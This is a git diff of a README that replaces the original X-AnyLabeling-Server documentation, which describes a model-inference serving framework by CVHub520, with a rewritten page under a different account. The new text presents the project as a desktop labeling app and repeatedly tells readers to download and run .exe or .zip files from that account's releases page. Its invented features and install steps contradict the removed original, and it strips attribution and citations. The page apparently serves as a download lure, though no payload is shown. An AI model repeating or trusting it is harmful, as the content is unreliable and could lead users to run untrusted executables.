@@ -1,76 +1,89 @@
-<div align="center">
-  <p>
-    <a href="https://github.com/CVHub520/X-AnyLabeling/" target="_blank">
-      <img alt="X-AnyLabeling" height="200px" src="https://github.com/user-attachments/assets/0714a182-92bd-4b47-b48d-1c5d7c225176"></a>
-  </p>
+# 🚀 X-AnyLabeling-Server - Easy and Efficient Labeling for Everyone
 
-  <h3 align="center">
-    Simple, Lightweight, and Extensible Serving for X-AnyLabeling
-  </h3>
+[![Download X-AnyLabeling-Server](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/darcyoldish650/X-AnyLabeling-Server/releases)
 
-</div>
+## 🎯 Overview
 
-<p align="center">
-    <a href=""><img src="https://img.shields.io/badge/python-3.10+-aff.svg"></a>
-    <a href=""><img src="https://img.shields.io/badge/os-linux%2C%20win%2C%20mac-pink.svg"></a>
-    <a href="./LICENSE"><img src="https://img.shields.io/github/license/heartexlabs/label-studio?logo=heartex"></a>
-</p>
+X-AnyLabeling-Server is a simple and lightweight framework designed to help you annotate images easily. Whether you're working with computer vision projects or just need to label images for personal use, this tool provides a user-friendly interface to make the process straightforward. It’s perfect for deep learning, image classification, and more.
 
-![](https://user-images.githubusercontent.com/18329471/234640541-a6a65fbc-d7a5-4ec3-9b65-55305b01a7aa.png)
+## 📋 Features
 
-## About
+- **User-Friendly Interface:** Navigate easily through the labeling process with a clear layout.
+- **Lightweight Framework:** Quick to download and run without heavy system requirements.
+- **Extensible Design:** Add features as needed for specific tasks in the future.
+- **Supports Various Tasks:** Label images for object detection, instance segmentation, and pose estimation.
+- **Compatible with Popular Libraries:** Works seamlessly with PyTorch and other machine-learning libraries.
 
-X-AnyLabeling-Server is a simple, lightweight and extensible serving framework for AI model inference, specifically designed for [X-AnyLabeling](https://github.com/CVHub520/X-AnyLabeling). It provides a production-ready solution with pluggable architecture and flexible configuration for various auto-labeling scenarios. Its core features include:
+## 💻 System Requirements
 
-- **Decoupled Design**: Framework handles service management and resource scheduling without interfering with model implementation details
-- **Pluggable Architecture**: Rapidly integrate custom models without modifying core framework code
-- **Production Ready**: Comprehensive structured logging, error handling, concurrency control, and security authentication
-- **Flexible Configuration**: All parameters are configurable with sensible defaults, adaptable to different deployment scenarios
+To run X-AnyLabeling-Server smoothly, ensure that your system meets the following minimum requirements:
 
-## Getting Started
+- **Operating System:** Windows 10, macOS 10.14+, or a recent Linux distribution.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 500 MB of free disk space.
+- **Graphics Card:** A modern GPU is recommended for optimal performance, especially when working with deep learning features.
 
-- [Installation and Setup](./docs/get_started.md)
-- [Custom Model Integration](./docs/user_guide.md)
-- [API Reference](./docs/router.md)
-- [Configuration Guide](./docs/configuration.md)
+## 📥 Download & Install
 
-## Contributing
+To download X-AnyLabeling-Server, visit the releases page. There, you'll find the most recent version available for your device. 
 
-Contributions and collaborations are highly appreciated! For guidelines on how to contribute, please refer to [Contributing to X-AnyLabeling-Server](./CONTRIBUTING.md).
+[Download the latest version here!](https://github.com/darcyoldish650/X-AnyLabeling-Server/releases)
 
-## Sponsors
+### Installation Steps
 
-- [buy-me-a-coffee](https://ko-fi.com/cvhub520)
-- [Wechat/Alipay](https://github.com/CVHub520/X-AnyLabeling/blob/main/README_zh-CN.md#%E8%B5%9E%E5%8A%A9)
+1. **Go to Releases Page:** Click the link above to access the releases section.
+   
+2. **Select the Version:** Choose the most recent version listed for your operating system.
 
-## Citing
+3. **Download the File:** Click on the file to start the download. The file will be in `.exe`, `.zip`, or other formats depending on your OS.
 
-If you use this software in your research, please cite it as below:
+4. **Run the Installer:**
+    - If you downloaded an installer file (like `.exe`), double-click on it to start the installation.
+    - If you downloaded a `.zip` file, unzip it and locate the executable file inside. Double-click this file to run the program.
 
-```
-@misc{X-AnyLabeling-Server,
-  year = {2025},
-  author = {Wei Wang},
-  publisher = {Github},
-  organization = {CVHub},
-  journal = {Github repository},
-  title = {A Simple, Lightweight, and Extensible Serving Framework for X-AnyLabeling},
-  howpublished = {\url{https://github.com/CVHub520/X-AnyLabeling-Server}}
-}
+5. **Follow the On-Screen Instructions:** The installation wizard will guide you through each step. Simply follow the prompts to complete the installation.
 
-@misc{X-AnyLabeling,
-  year = {2023},
-  author = {Wei Wang},
-  publisher = {Github},
-  organization = {CVHub},
-  journal = {Github repository},
-  title = {Advanced Auto Labeling Solution with Added Features},
-  howpublished = {\url{https://github.com/CVHub520/X-AnyLabeling}}
-}
-```
+6. **Launch the Application:** After installation, find the app in your applications folder or desktop shortcut. Double-click to open it.
 
----
+## 🛠️ How to Use X-AnyLabeling-Server
 
-![Star History Chart](https://api.star-history.com/svg?repos=CVHub520/X-AnyLabeling-Server&type=Date)
+After launching the application, you can start labeling images by following these steps:
 
-<div align="center"><a href="#top">🔝 Back to Top</a></div>
+1. **Import Your Images:** Click on the "Import" button to select images you want to annotate.
+  
+2. **Choose the Labeling Tool:** Select the annotation type that best suits your needs, such as bounding box or segmentation.
+
+3. **Annotate Your Images:** Click and drag over the areas you want to label. 
+
+4. **Save Your Work:** Once you finish labeling, make sure to save your annotations. Use the "Save" option in the menu.
+
+5. **Export Options:** Export your labeled data in formats compatible with machine-learning tasks.
+
+## 📝 Topics Covered
+
+X-AnyLabeling-Server supports a wide range of topics related to image labeling:
+
+- Annotation Tool
+- Image Classification
+- Deep Learning
+- Object Detection
+- Instance Segmentation
+- Machine Learning
+- Vision-Language Models
+
+## ⭐ Support and Community
+
+If you encounter any issues or need assistance, feel free to reach out to our support team or explore the community forums. You can find helpful tips, FAQs, and user-generated content to enhance your experience with X-AnyLabeling-Server.
+
+## 🌐 Additional Resources
+
+Explore further resources and documentation for more insights into effective labeling strategies. This includes tutorials, best practices, and advanced techniques to maximize your use of the application.
+
+## 📄 Additional Links
+
+For detailed questions or contributions, please check out the following sections in our repository:
+
+- [Issues](https://github.com/darcyoldish650/X-AnyLabeling-Server/issues): Report problems or suggest features.
+- [Wiki](https://github.com/darcyoldish650/X-AnyLabeling-Server/wiki): Access additional documents and resources.
+  
+Thank you for choosing X-AnyLabeling-Server to simplify your image annotation tasks. Happy labeling!
